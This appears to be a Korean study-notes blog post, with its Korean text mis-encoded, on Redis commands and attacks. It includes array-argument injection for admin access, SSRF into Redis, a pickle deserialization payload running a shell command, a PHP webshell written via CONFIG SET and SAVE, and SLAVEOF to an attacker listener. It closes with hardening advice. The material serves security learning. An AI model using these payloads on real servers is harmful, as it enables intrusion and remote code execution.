---
title: "[2025-07-23] Redis"
excerpt: "Redis ê°œë… ì •ë¦¬"

categories:
  - Justice
tags:
  - [SQL Injection, NoSQL Injection]

permalink: /Justice/[2025-07-23] Redis/

toc: true
toc_sticky: true

date: 2025-07-23
last_modified_at: 2025-07-23
---

## ğŸ¦¥ ë³¸ë¬¸

## Redis

ë©”ëª¨ë¦¬ ê¸°ë°˜ì˜ Key-Value ì €ì¥ì†Œ. ì˜¤í”ˆì†ŒìŠ¤ NoSQL ë°ì´í„°ë² ì´ìŠ¤. 

### ëª…ë ¹ì–´

- ë°ì´í„° ì¡°ì‘ ëª…ë ¹ì–´

| ëª…ë ¹ì–´ | êµ¬ì¡° | ì„¤ëª… |
| --- | --- | --- |
| `GET` | `GET key` | ë°ì´í„° ì¡°íšŒ |
| `MGET` | `MGET key [key ...]` | ì—¬ëŸ¬ ë°ì´í„°ë¥¼ ì¡°íšŒ |
| `SET` | `SET key value` | ìƒˆë¡œìš´ ë°ì´í„° ì¶”ê°€ |
| `MSET` | `MSET key value [key value ...]` | ì—¬ëŸ¬ ë°ì´í„°ë¥¼ ì¶”ê°€ |
| `DEL` | `DEL key [key ...]` | ë°ì´í„° ì‚­ì œ |
| `EXISTS` | `EXISTS key [key ...]` | ë°ì´í„° ìœ ë¬´ í™•ì¸ |
| `INCR` | `INCR key` | ë°ì´í„° ê°’ì— 1 ë”í•¨ |
| `DECR` | `DECR key` | ë°ì´í„° ê°’ì— 1 ëºŒ |
- DBMS ê´€ë¦¬ ëª…ë ¹ì–´

| ëª…ë ¹ì–´ | êµ¬ì¡° | ì„¤ëª… |
| --- | --- | --- |
| `INFO` | `INFO [section]` | DBMS ì •ë³´ ì¡°íšŒ |
| `CONFIG GET` | `CONFIG GET parameter` | ì„¤ì • ì¡°íšŒ |
| `CONFIG SET` | `CONFIG SET parameter value` | ìƒˆë¡œìš´ ì„¤ì • ì…ë ¥ |

### ê³µê²© ê¸°ë²•

- NodeJS redis ëª¨ë“ˆì˜ Command ì²˜ë¦¬ ë°©ë²• ì¤‘ ë°°ì—´ ì²˜ë¦¬ ì½”ë“œ

```jsx
if (Array.isArray(arguments[0])) {
    arr = arguments[0];
    if (len === 2) {
        callback = arguments[1];
    }
}
return this.internal_send_command(new Command(command, arr, callback));
```

ìœ„ì˜ ì½”ë“œëŠ” ì²« ë²ˆì§¸ ì¸ìê°€ ë°°ì—´ì¸ ê²½ìš°ì— arrì— í• ë‹¹í•œë‹¤. ë§Œì•½ ë‘ ë²ˆì§¸ ì¸ìê°€ ìˆë‹¤ë©´ callbackì— í• ë‹¹í•œë‹¤. ê·¸ë˜ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì‘ë™í•œë‹¤.

```jsx
redis.set(....)

Command("set", ...);

//ë¬¸ìì—´ íƒ€ì…ì¼ ê²½ìš°
Command("set", "key", "value", callback)
-> SET key value ê°€ ì‘ë™

//ë°°ì—´ì˜ ê²½ìš°
Command("set", ["key", "value"], callback)
-> SET key valueê°€ ì‘ë™

```

ì´ ì ì„ ì´ìš©í•˜ì—¬ ê³µê²© ë°©ì‹ì€ ë‹¤ìŒê³¼ ê°™ë‹¤

```jsx
http://localhost:3000/init?uid[]=test&uid[]={"level":"admin"}

uid = ["test", '{"level":"admin"}']

redis.set(uid)
Command("set", ["test", '{"level":"admin"}'])
SET test {"level":"admin"}

//ë¡œê·¸ì¸ì„ í•˜ëŠ” ê¸°ëŠ¥
const userData = JSON.parse(redis.get("test"));
if (userData.level === "admin") {
  // ê´€ë¦¬ì ê¶Œí•œ ë¶€ì—¬
}
```

### ê³µê²© ê¸°ë²• : SSRF

RedisëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì¸ì¦ ìˆ˜ë‹¨ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ ì¸ì¦ ê³¼ì • ì—†ì´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.

```jsx
$ echo -e "anydata: anydata\r\nget hello" | nc 127.0.0.1 6379
-ERR unknown command 'anydata:'
$5
world
```

- echo -eë¥¼ í†µí•´ ì—¬ëŸ¬ ì¤„ì˜ í…ìŠ¤íŠ¸ë¥¼ ìƒì„±í•˜ê³  ncë¥¼ í†µí•´ Redis(127.0.0.1 6379)ì— ë³´ë‚´ê²Œ ëœë‹¤.
- ì²« ë²ˆì§¸ ëª…ë ¹ì–´ì¸ anydataëŠ” ìœ íš¨í•˜ì§€ ì•Šì€ ë°ì´í„°ì´ë¯€ë¡œ Errorê°€ ë‚˜ì˜¨ë‹¤
- ë‘ ë²ˆì§¸ ëª…ë ¹ì–´ì¸ get helloëŠ” ì „ë‹¬ë˜ì–´ Redisì—ì„œ Get helloë¡œ ì‘ë™í•œë‹¤.
    - helloë¼ëŠ” í‚¤ ê°’ì„ ì°¾ê³  value ê°’ì¸ worldë¥¼ ì¶œë ¥í•œë‹¤
    - worldì˜ ë°”ì´íŠ¸ ìˆ˜ë¥¼ ì¶œë ¥í•œë‹¤.

ìœ„ì™€ ê°™ì´ ì˜ëª»ëœ ëª…ë ¹ì–´ê°€ ìˆì–´ë„ ê·¸ ë‹¤ìŒ ëª…ë ¹ì–´ë“¤ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” Redisì˜ íŠ¹ì„±ì„ ì´ìš©í•˜ì—¬ Redisì— HTTP í”„ë¡œí† ì½œì„ ë³´ë‚´ì–´ ê³µê²©í•˜ëŠ” ë°©ë²•ì´ ìˆë‹¤.

```jsx
POST / HTTP/1.1
host: 127.0.0.1:6379
user-agent: Mozilla/5.0...
content-type: application/x-www-form-urlencoded
data=a
SET key value
...
```

- POST / HTTP/1.1 ê°™ì€ ëª…ë ¹ì–´ë“¤ì€ ëª¨ë¥´ê² ì§€ë§Œ Bodyì— Redis ëª…ë ¹ì–´ë¥¼ ì‚½ì…í•˜ë©´ ì‘ë™í•˜ê²Œ í•´ë‹¹ ëª…ë ¹ì–´ë“¤ì´ ì‘ë™í•˜ê²Œ ëœë‹¤.

í•˜ì§€ë§Œ ì¼ë¶€ í‚¤ì›Œë“œë¥¼ ê°ì§€í•˜ê³  ì—°ê²°ì„ ëŠì–´ ë‹¤ìŒ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ì§€ ì•Šê²Œ íŒ¨ì¹˜ë˜ì—ˆë‹¤.

### ê³µê²© ê¸°ë²• : django-redis-cache

Djangonì—ì„œ Redisë¥¼ ì´ìš©í•˜ì—¬ Cacheë¥¼ êµ¬í˜„í•  ìˆ˜ ìˆëŠ” íŒŒì´ì¬ ëª¨ë“ˆì´ë‹¤. `p_set` í•¨ìˆ˜ì—ì„œ `cache.set` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í‚¤ë¥¼ ìƒì„±í•œë‹¤. ì €ì¥í•  ë•Œì—ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ pickle ì§ë ¬í™”ë¥¼ í•œë‹¤

- optionsì—ì„œ selrializer_classë¥¼ í†µí•´ ì§ë ¬í™”í•  í´ë˜ìŠ¤ë¥¼ ì •í•  ìˆ˜ ìˆë‹¤.
    - ëŒ€í‘œì ì¸ ëª¨ë“ˆë¡œ pickleê³¼ yamlì´ ì¡´ì¬
- pickle ì§ë ¬í™” : JSONì´ë‚˜ ê°ì²´ë¥¼ pythonë§Œ ì•Œì•„ë³¼ ìˆ˜ ìˆëŠ” ë°”ì´ë„ˆë¦¬ë¡œ ë°”ê¾¸ëŠ” ê²ƒ

â†’ ì—­ì§ë ¬í™” ê³¼ì •ì„ ì•…ìš©í•˜ì—¬ ì•…ì˜ì ì¸ í–‰ìœ„ë¥¼ ìˆ˜í–‰í•˜ê±°ë‚˜, íŠ¹ì • ìƒí™©ì—ì„œ í˜¸ì¶œë˜ëŠ” ë©”ì†Œë“œë¥¼ ì´ìš©í•´ ê³µê²©í•  ìˆ˜ ìˆë‹¤.

`object.__reduce__()`ëŠ” ê°ì²´ ê³„ì¸µ êµ¬ì¡°ë¥¼ unpickling í•  ë•Œ ê°ì²´ë¥¼ ì¬êµ¬ì„±í•˜ëŠ” íŠœí”Œì„ ë°˜í™˜í•˜ëŠ” ë©”ì†Œë“œë¡œ í˜¸ì¶œ ê°€ëŠ¥í•œ ê°ì²´ë¥¼ ë°˜í™˜í•  ìˆ˜ ìˆë‹¤. ì´ ë•Œ `system` ê°™ì´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ë¥¼ ë°˜í™˜í•˜ë©´ ì‹œìŠ¤í…œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤.

```jsx
import pickle
import os
class TestClass:
  def __reduce__(self):
  	return os.system, ("id", )
ClassA = TestClass()
# ClassA ì§ë ¬í™”
ClassA_dump = pickle.dumps(ClassA)
print(ClassA_dump)
# ì—­ì§ë ¬í™”
pickle.loads(ClassA_dump)

$ python3 pickleExploit.py
b'\x80\x03cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```

### ê³µê²© ê¸°ë²• : ëª…ë ¹ì–´

- SAVE ëª…ë ¹ì–´ : ë©”ëª¨ë¦¬ì˜ íœ˜ë°œì„± ë•Œë¬¸ì— íŒŒì¼ ì‹œìŠ¤í…œì— ì €ì¥í•˜ëŠ” ëª…ë ¹ì–´. ë‹¤ë¥¸ Redis ëª…ë ¹ì–´ë¥¼ í†µí•´ íŒŒì¼ ì €ì¥ ê²½ë¡œ, ì£¼ê¸°, ì´ë¦„, ë°ì´í„° ë“±ì„ ì„¤ì •í•  ìˆ˜ ìˆë‹¤.
    
    ```jsx
    CONFIG set dir /tmp
    CONFIG set dbfilename redis.php
    SET test "<?php system($_GET['cmd']); ?>"
    SAVE
    
    $ ls -al redis.php 
    -rw-rw---- 1 redis redis 57 May 17 16:59 redis.php
    $ xxd redis.php 
    00000000: 5245 4449 5330 3030 36fe 0000 0474 6573  REDIS0006....tes
    00000010: 741e 3c3f 7068 7020 7379 7374 656d 2824  t.<?php system($
    00000020: 5f47 4554 5b27 636d 6427 5d29 3b20 3f3e  _GET['cmd']); ?>
    00000030: ffef 0fe2 9f24 c9b8 a3                   .....$...
    ```
    
    - ìœ„ì™€ ê°™ì´ /tmp ê²½ë¡œì— webshellì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆëŠ” redis.php íŒŒì¼ì„ ì €ì¥í•œë‹¤.
- SLAVEOF / REPLICAOF : ë§ˆìŠ¤í„°-ìŠ¬ë ˆì´ë¸Œ ê´€ê³„ë¥¼ ë§ºì„ ìˆ˜ ìˆìœ¼ë©°, ì—°ê²°ì„ ë§ºìœ¼ë©´ ë§ˆìŠ¤í„° ë…¸ë“œì˜ ë°ì´í„°ë¥¼ ë³µì œí•˜ê³  ì €ì¥í•œë‹¤. ë‘˜ ë‹¤ ê°™ì€ ëª…ë ¹ì–´ì´ì§€ë§Œ REPLICAOFë¥¼ ê¶Œì¥í•œë‹¤.
    
    ```jsx
    SLAVEOF 127.0.0.1 8888
    REPLICAOF 127.0.0.1 8888
    ```
    
    - ë™ì‘ íë¦„
        1. ìŠ¬ë ˆì´ë¸Œ Redis ì¸ìŠ¤í„´ìŠ¤ëŠ” ì§€ì •í•œ IPì™€ í¬íŠ¸ë¡œ TCP ì—°ê²°ì„ ì‹œë„
        2. ìŠ¬ë ˆì´ë¸Œê°€ ë§ˆìŠ¤í„°ì—ê²Œ PINGì„ ë³´ë‚´ê³  ë§ˆìŠ¤í„°ëŠ” PONGìœ¼ë¡œ ì‘ë‹µí•˜ì—¬ ë§ˆìŠ¤í„°ê°€ ì •ìƒì¸ ì§€ í…ŒìŠ¤íŠ¸
        3. ìƒíƒœì— ë”°ë¼ ì¼ë¶€ë¶„ ë™ê¸°í™” í˜¹ì€ ì „ì²´ ë³µì œ(ìŠ¤ëƒ…ìƒ·ì„ í†µí•´)ë¥¼ ì§„í–‰ 
    - ê³µê²©ì ì„œë²„
        
        ```jsx
        $ nc -l 8888 -kv
        Listening on [0.0.0.0] (family 0, port 8888)
        Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 52613)
        PING
        ```
        
        - ì´ ë•Œ ë§ˆìŠ¤í„°ë¥¼ ê³µê²© ì„œë²„ì—ì„œ 8888ì—ì„œ ëŒ€ê¸°í•˜ì—¬ PINGì„ ìˆ˜ì‹  ë°›ìœ¼ë©´ Redisê°€ ì ‘ì†í–ˆë‹¤ëŠ” ê²ƒ.
        
        â†’ SSRF ê³µê²© ì„±ê³µ
        
- MODULE LOAD : ë™ì  ëª¨ë“ˆì„ ì™¸ë¶€ì—ì„œ ë¡œë“œí•´ì„œ ì‹¤í–‰ ê°€ëŠ¥í•œ ê¸°ëŠ¥ì„ í™•ì¥í•  ë•Œ ì‚¬ìš©í•˜ëŠ” ëª…ë ¹ì–´.
    
    ```jsx
    $ redis-cli
    127.0.0.1:6379> module load /var/lib/redis/module.so
    OK
    127.0.0.1:6379> module list
    1) 1) "name"
       2) "example"
       3) "ver"
       4) (integer) 1
    127.0.0.1:6379> EXAMPLE.TEST
    PASS
    ```
    
    - ìœ„ì˜ ì½”ë“œëŠ” ì»¤ìŠ¤í…€ ëª¨ë“ˆì„ ë¡œë“œí•˜ê³  ë‹¤ë¥¸ ëª¨ë“ˆì¸ `example`ì„  ì‹¤í–‰í•˜ëŠ” ì½”ë“œ.
    - ê³µê²©ì„ ìœ„í•´ì„œëŠ” Redis í´ë¼ì´ì–¸íŠ¸ê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì—…ë¡œë“œ ìƒì„±í•  ìˆ˜ ìˆì–´ì•¼ í•¨.

### ì£¼ì˜ ì‚¬í•­

- ì¸ì¦ ê³¼ì • ì¶”ê°€ : redis.conf íŒŒì¼ì„ í†µí•´ DBMS ì„¤ì • ê´€ë¦¬. ë¹„ë°€ë²ˆí˜¸ ì§€ì • ê°€ëŠ¥
    
    ```jsx
    $ cat /etc/redis/redis.conf 
    ... 
    requirepass pass1234
    ```
    
    - íŒŒì¼ì„ ì„¤ì •ì„ ì ìš©í•˜ë©´ `AUTH` ëª…ë ¹ì–´ë¥¼ í†µí•´ ì¸ì¦ ê³¼ì •ì„ ê±°ì¹¨
    
    ```jsx
    $ sudo service redis-server restart
    ...
    $ redis-cli
    127.0.0.1:6379> keys *
    (error) NOAUTH Authentication required.
    127.0.0.1:6379> AUTH pass1234
    OK
    127.0.0.1:6379> keys *
    1) "foo"
    ```
    
    - ì¶”ê°€ì ìœ¼ë¡œ ë©€í‹° ìœ ì €ì™€ Access Control List(ì ‘ê·¼ ê¶Œí•œ ì œì–´)ë¥¼ í†µí•´ ì ‘ê·¼ ì œì–´ë¥¼ ì„¤ì •
- ë°”ì¸ë”© : ê¸°ë³¸ì ìœ¼ë¡œ `127.0.0.1` ì´ì§€ë§Œ ì™¸ë¶€ ì ‘ì†ì´ ê°€ëŠ¥í•´ì•¼í•  ë•Œë„ ìˆìŒ. ì„¤ì • íŒŒì¼ì—ì„œ `BIND` ë¥¼ í†µí•´ ë°”ì¸ë”© ì£¼ì†Œ ë³€ê²½
    
    ```jsx
    # ê¸°ë³¸ ì„¤ì •
    BIND 127.0.0.1
    # ìœ„í—˜í•œ ì„¤ì •
    # BIND 127.0.0.1 # ì£¼ì„ ì²˜ë¦¬ ì‹œ ëª¨ë“  IP ì ‘ì†ì„ í—ˆìš© -> ì·¨ì•½ì 
    BIND 0.0.0.0
    # ê¸°ëŠ¥ì ìœ¼ë¡œ í—ˆìš©í•´ì•¼ í•˜ëŠ” ê²½ìš° ê¶Œê³  ì„¤ì •, 
    # IP ì§€ì •ì„ í†µí•´ í•´ë‹¹ IPë§Œ í—ˆìš©í•˜ë©° í—ˆìš©í•˜ëŠ” IPì— ëŒ€í•œ ì£¼ê¸°ì ì¸ í™•ì¸ì´ í•„ìš”í•©ë‹ˆë‹¤.
    BIND 192.168.1.2 127.0.0.1
    ```
    
- ì¤‘ë³µ í‚¤ ì‚¬ìš© : í‚¤ ëª…ì¹­ì´ ì¤‘ë³µë˜ëŠ” ê²½ìš° ë¬¸ì œ ë°œìƒ.
    - RedisëŠ” DBë¥¼ ì¸ë±ìŠ¤ë¡œ êµ¬ë¶„. 0~16
        
        ```jsx
        r0 = redis.createClient({ db: 0 }); // db 0 ì—°ê²°
        r1 = redis.createClient({ db: 1 }); // db 1 ì—°ê²°
        r0.select(1, function(err){...});   // db 0 ì—ì„œ 1ë¡œ ë³€ê²½
        ```
        
    - ìºì‹œë¥¼ êµ¬í˜„í•  ë•Œ íƒ€ì…(ìœ ì € ì •ë³´, ì¸ì¦ ì •ë³´, ì„ì‹œ ë°ì´í„°..) ë³„ë¡œ ì„œë²„ë¥¼ ë¶„ë¦¬í•˜ì§€ ì•Šìœ¼ë©´ ë¬¸ì œ ë°œìƒ.
    - í‚¤ ëª…ì¹­ì„ êµ¬ë¶„ì ì—†ì´ ì‚¬ìš©í•˜ê±°ë‚˜ ì´ìš©ì ì…ë ¥ê°’ìœ¼ë¡œ í‚¤ ëª…ì¹­ìœ¼ë¡œ ì‚¬ìš©í•  ë•Œ ë¬¸ì œ ë°œìƒ
    - EX) ì´ìš©ìì˜ ë©”ì¼ ì¸ì¦ ì •ë³´ì™€ ì¸ì¦ íšŸìˆ˜ ì½”ë“œ
        
        ```jsx
        SET key value
        # ì‚¬ìš©ì ë©”ì¼ ì¸ì¦ ë²ˆí˜¸ ì €ì¥ ì‹œ
        SET {email} {random number}
        # ì‚¬ìš©ì ë©”ì¼ ì¸ì¦ íšŸìˆ˜ ì €ì¥ ì‹œ
        SET {email}_count 0
        ```
        
        ```jsx
        //1. user1@dreamhack.io_count ì…ë ¥ 
        user1@dreamhack.io_count = {random number}
        user1@dreamhack.io_count_count = 0  
        
        //2. user1@dreamhack.io ì…ë ¥.
        //  -> ê¸°ì¡´ì˜ user1@dreamhack.io_countì˜ ëœë¤ìˆ«ìê°€ 0ì´ ë¨.
        user1@dreamhack.io_count = 0
        user1@dreamhack.io_count_count = 0
        user1@dreamhack.io = {random number}
        ```